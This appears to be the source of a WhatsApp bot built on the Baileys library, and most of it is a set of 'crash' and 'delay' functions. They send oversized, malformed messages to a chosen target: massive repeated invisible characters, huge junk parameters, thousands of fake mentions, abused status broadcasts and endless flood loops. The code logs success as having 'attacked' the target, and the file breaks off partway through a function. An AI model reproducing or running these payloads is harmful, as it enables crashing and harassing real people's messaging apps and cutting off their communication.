console.clear();
require('./setting/config')

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = zax = async (zax, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./System/x1')

//END

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await zax.decodeJid(zax.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await zax.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''

const zaxyzy = fs.readFileSync(`./System/Thumb.jpg`)

if (!zax.public) {
if (!CreatorOnly) return
}
//- P -\\
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`# New Message`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

const rnp = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
    },
    message: {
        interactiveMessage: {
            header: {
                hasMediaAttachment: true,
                jpegThumbnail: fs.readFileSync('./System/Thumbnail.jpg')
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "review_and_pay",
                        buttonParamsJson: JSON.stringify({
                            currency: "IDR",
                            payment_configuration: "",
                            payment_type: "",
                            total_amount: { value: 72050000, offset: 100 },
                            reference_id: "X",
                            type: "physical-goods",
                            order: {
                                status: "preparing_to_ship",
                                description: "",
                                subtotal: { value: 72050000, offset: 100 },
                                order_type: "ORDER",
                                items: [
                                    {
                                        retailer_id: "25127408720248432",
                                        product_id: "25127408720248432",
                                        name: "ZaxUniver - WaBot",
                                        amount: { value: 72050000, offset: 100 },
                                        quantity: 1
                                    }
                                ]
                            },
                            additional_note: "",
                            native_payment_methods: [],
                            share_payment_status: false
                        })
                    }
                ]
            }
        }
    }
};

// Fungsi Reply (UPDATE quoted: rnp)
const Replyzax = (teks) => {
    return zax.sendMessage(
        m.chat,
        {
            text: teks,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 99999999,
                isForwarded: true,
                externalAdReply: {
                    title: "#universqlnject",
                    body: "© azaxm",
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    showAdAttribution: false,
                    thumbnailUrl: "https://daffa-dev.my.id/upload/oaiko.jpg",
                    sourceUrl: ""
                }
            }
        },
        { quoted: rnp }  // <-- GANTI zets JADI rnp
    );
};

//FUNCTION
async function freeze(target, Ptcp = true) {
  try {
    await zax.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "RyyV1XFreeze 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n".repeat(83000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "2@newsletter",
                  "3@newsletter",
                  "4@newsletter",
                  "5@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "5@newsletter",
                    groupSubject: "𝐑𝐲𝐲𝐕𝐬𝐌𝐚𝐤𝐁𝐚𝐩𝐚𝐤 𝐋𝐨 🤭",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function crashui(target, mention) {
  try {
    let sxo = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝐑𝐲𝐲 𝐗 𝐒𝐚𝐭𝐚𝐧𝐢𝐜𝐯𝟏" +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@5".repeat(50000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(10000),
              version: 3
            },
            entryPointConversionSource: "galaxy_message",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    await sleep(1000);

    let sXoMessage = {
      extendedTextMessage: {
        text: "ꦾ".repeat(3000) +
              "ោ៝".repeat(25000) +
              "ꦾ".repeat(25000) +
              "@12".repeat(50000), 
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 850 }, // Lu bisa kurangin lagi tapi ini udh rekomen
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const xso = generateWAMessageFromContent(target, sXoMessage, {});

    await zax.relayMessage("status@broadcast", xso.message, {
      messageId: xso.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

    if (mention) {
      await zax.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: xso.key.id,
              type: 25,
            },
          },
        },
      }, {});
    }

    await sleep(1000);

    await zax.relayMessage("status@broadcast", sxo.message, {
      messageId: sxo.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

    if (mention) {
      await zax.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: sxo.key.id,
              type: 25,
            },
          },
        },
      }, {});
    }
  } catch (error) {
    console.error("Error di :", error, "Tai Mark ");
  }
}


async function delay10(target) {
  const mentioned = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

  const invisibleChar = '\u2063'; // karakter invisible
  const longText = invisibleChar.repeat(500000) + "@0".repeat(50000);
  
  const payload = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 9999,
              degreesLongitude: 9999
            },
            hasMediaAttachment: true
          },
          body: {
            text: longText
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: mentioned
          }
        },
        groupStatusMentionMessage: {
          groupJid: target,
          mentionedJid: mentioned,
          contextInfo: {
            mentionedJid: mentioned
          }
        }
      }
    }
  };

  try {
    await zax.relayMessage(target, payload, {
      participant: { jid: target },
      messageId: undefined
    });
    console.log(`🚀 DelayMessage sent to ${target}`);
  } catch (err) {
    console.error(`❌ Failed to send GyzendelayFlow message:`, err);
  }
}

async function delay9(target, mention) {
    console.log(chalk.red(`Succes Sending Bug`));
    let message = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "!",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_message",
              paramsJson: "\x10".repeat(1000000),
              version: 2
            },
          },
        },
      },
    };
    
    const msg = generateWAMessageFromContent(target, message, {});

  await zax.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await zax.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function crashblank2(zax, target) {
  while (true) {
    try {
      const Messages = [
        "0@s.whatsapp.net",
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 5000 }, () =>
          "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
        ),
      ];

      for (let i = 0; i < 75; i++) {
        const mediaFlood = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: { text: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" },
                contextInfo: {
                  forwardingScore: 9999,
                  isForwarded: true,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  mentionedJid: Messages,
                },
                nativeFlowMessage: {
                  buttons: [
                    { name: "single_select", buttonParamsJson: "" },
                    { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
                  ],
                  messageParamsJson: "{{".repeat(15000),
                },
              },
              extendedTextMessage: {
                text: "ꦾ".repeat(25000) + "@1".repeat(25000),
                contextInfo: {
                  stanzaId: target,
                  participant: target,
                  quotedMessage: {
                    conversation: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" +
                      "ꦾ࣯࣯".repeat(60000) +
                      "@1".repeat(30000),
                  },
                },
                inviteLinkGroupTypeV2: "DEFAULT",
              },
            },
          },
        };

        const msg = generateWAMessageFromContent(target, mediaFlood, {});
        await zax.relayMessage(target, msg.message, {
          messageId: msg.key.id,
          statusJidList: [target],
        });
      }
    } catch (err) {
    }

    await new Promise(res => setTimeout(res, 5000));
  }
}

async function blankcrash2(target) {
  const img = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
    fileLength: "62265",
    height: 1080,
    width: 1080,
    mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
    fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };

  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: `blue yungkai!\n` + "\u0000" + "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          imageMessage: img,
                        },
                        body: {
                          text: "\u0000" + "ꦾ".repeat(900000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(900)}","url":"https://t.me/Jcodeest4r","merchant_url":"https://google.com"}`,
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: `{"title":"Section ${"ꦾ".repeat(900)}","sections":[{"title":"Janda","rows":[]}]}`,
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: `{"display_text":"Section ${"ꦾ".repeat(9000)}","title":"Crash","id":".clickme"}`,
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        mentions: ["13135550002@s.whatsapp.net"],
      }
    );

    await zax.relayMessage(target, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0
              },
              hasMediaAttachment: true
            },
            body: {
              text: "#" + "ꦾ".repeat(300000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [{ groupJid: "x", groupSubject: " x " }]
            }
          }
        }
      }
    }, { participant: { jid: target } }, { messageId: null });

    console.log(chalk.red.bold("System UI Successfully Attacked Target"));
  } catch (error) {
    console.error("An error occurred:", error);
  }
}


async function delay8(target, ptcp = true) {
    for (let r = 0; r < 1000; r++) {
        const payload = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "jokowi",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        },
        );

        await zax.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message,
            },
        }, ptcp ?
            {
                messageId: payload.key.id,
                participant: { jid: target }
            } : { messageId: payload.key.id }
        );
        await sleep(1000);
    }

    const message = {
        viewOnceMessage: {
            message: {
                requestPaymentMessage: {
                    body: {
                        text: "#",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "review_and_pay",
                        paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                        version: 3
                    }
                }
            }
        }
    };

    await zax.relayMessage(target, message, {
        groupId: null,
        participant: { jid: target }
    });

    await zax.relayMessage(
        target,
        {
            sendPaymentMessage: {},
            requestPaymentMessage: {},
            imageMessage: {
                url: null
            }
        },
        {
            participant: { jid: target }
        }
    );
}


async function delay7(target) {
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "WHEN YAH",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    };

    const msg2 = {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    };

    for (let i = 0; i < 1000; i++) {
        const payload = generateWAMessageFromContent(target, msg1, msg2);

        await zax.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { messageId: payload.key.id, participant: { jid: target } });

        await sleep(1000);
    }

    await zax.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}


async function delay6(zax, target) {
  const kira = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await zax.relayMessage("status@broadcast", kira, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`Succes send bug delay to ${target} by akira`))
}
/*async function crashblank1(target) {
  await zax.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",

        name: "Faiq Crash 🩸+ "ꦾ".repeat(40000),
        publisher: "ꦽ".repeat(20000),
        stickers: [],

        fileLength: 12260,
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",

        directPath:
          "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",

        height: 9999,
        width: 9999,

        mediaKeyTimestamp: "1747502082",

        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,

        emojis: ["🐉", "👾", "🩸", "♻️"],

        contextInfo: {
          mentionedJid: [
            "131338822@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
          remoteJid: "X",
          participant: target,
          stanzaId: "1234567890ABCDEF",

          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000,
            },
          },
        },

        packDescription: "",
        trayIconFileName:
          "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",

        thumbnailDirectPath:
